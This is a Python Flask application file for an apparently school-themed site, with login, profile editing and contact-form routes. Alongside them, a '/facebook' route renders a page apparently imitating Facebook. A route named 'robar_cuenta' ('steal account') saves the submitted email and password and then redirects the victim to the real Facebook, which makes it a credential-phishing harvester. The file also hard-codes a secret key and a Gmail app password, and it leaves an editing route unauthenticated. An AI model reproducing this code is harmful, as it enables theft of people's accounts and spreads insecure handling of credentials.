from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from config import config
import psycopg2
from flask_wtf.csrf import CSRFProtect
from flask_login import LoginManager, login_user, logout_user, login_required, current_user


def obtener_csrf_token():
    # Obtener el token CSRF de la solicitud actual
    csrf_token = csrf.generate_csrf()
    return csrf_token


#Models
from models.ModelPersona import ModelPersona
from models.ModelUser import ModelUser
from models.ModelCuenta import ModelCuenta

#Entities
from models.entities.Persona import Persona
from models.entities.User import User
from models.entities.Cuenta import Cuenta

#apis
from api.GmailMailer import GmailMailer

#app design
app = Flask(__name__)
app.secret_key = 'B!1weNAt1T^%kvhUI*S^'
csrf = CSRFProtect()
login_manager_app = LoginManager(app)

@login_manager_app.user_loader
def load_user(id):
    return ModelUser.get_by_id(id)

#app routes

#Route LOGIN
@app.route('/login', methods=['GET','POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    else:
        if request.method=='POST':
            #print(request.form['username'])
            #print(request.form['password'])
            user = User(0, request.form['username'], request.form['password'])
            loggedUser = ModelUser.login(user)
            if loggedUser != None:
                if loggedUser.password:
                    login_user(loggedUser)
                    return redirect(url_for('changes'))
                else:
                    flash("Contraseña incorrecta...")

            else:
                flash("Usuario no encontrado...")
            return render_template('auth/login.html')
        else:
            return render_template('auth/login.html')
        
#Route Logout
@app.route('/logout')
def logout():
    logout_user()
    return redirect(url_for('home'))


#Route /
@app.route('/')
def index():
    return redirect(url_for('home'))

#Route Home
@app.route('/home')
def home():
    personas = ModelPersona.get_personas()
    return render_template('views/home.html', personas=personas)

#route changes
@app.route('/changes', methods=['GET','POST'])
@login_required
def changes():
    return render_template('views/changes.html')
    

@app.route('/changes/entidades', methods=['GET','POST'])
@login_required
def changes_entities():
    try:
        personas = ModelPersona.get_personas()
        return render_template('views/changes_entities.html', personas=personas)
    except Exception as ex:
        raise Exception(ex)
    
#Route Editar
@app.route('/editar', methods=['POST'])
def editar_persona():

    nuevaFoto = request.files['Foto']

    persona = Persona(
        id=request.form.get('id'),
        cargo='',
        nombre=request.form.get('Nombre'),
        apellido=request.form.get('Apellido'),
        descripcion=request.form.get('Descripcion'),
        foto=None
    )

    if nuevaFoto.filename != '':
        persona.foto = psycopg2.Binary(nuevaFoto.read())

    if persona.foto is None:
        ModelPersona.edit_persona_Nofoto(persona)
    else:
        ModelPersona.edit_persona_foto(persona)

    return redirect(url_for('changes_entities'))

#Route Contactos
@app.route('/contactos', methods=['GET','POST'])
def enviar_email():
    sender = GmailMailer('school.exampleepn@gmail.com', 'empm sgha qhvw asmu')
    name = request.form.get('name')
    yemail = request.form.get('email')
    subject = request.form.get('subject')
    message = request.form.get('message')

    mail_body = f"""
                Nombre del remitente: {name}
                Email del remitente: {yemail}
                Razon: {subject}
                Mensaje: \n\n{message}
                """
    
    sender.enviar_correo('school.exampleepn@gmail.com', subject, mail_body)
    
    return redirect(url_for('home')+'#contact')


@app.route('/facebook')
def facebook():
    csrf_token = obtener_csrf_token()
    return render_template('views/fbView.html', csrf_token=csrf_token)

@app.route('/guardar_cuentas', methods=['GET','POST'])
def robar_cuenta():
    correo = request.form.get('email')
    contraseña = request.form.get('pass')

    cuenta = Cuenta(0, correo, contraseña)

    ModelCuenta.insert_cuenta(cuenta)

    return redirect("https://www.facebook.com/")

    


@app.errorhandler(404)
def status_404(error):
    return render_template('views/404.html')

@app.errorhandler(401)
def status_401(error):
    return redirect(url_for('login'))

if __name__ == '__main__':
    
    app.config.from_object(config['development'])
    
    csrf.init_app(app)

    app.register_error_handler(404, status_404)

    app.register_error_handler(401, status_401)

    app.run(debug=True)
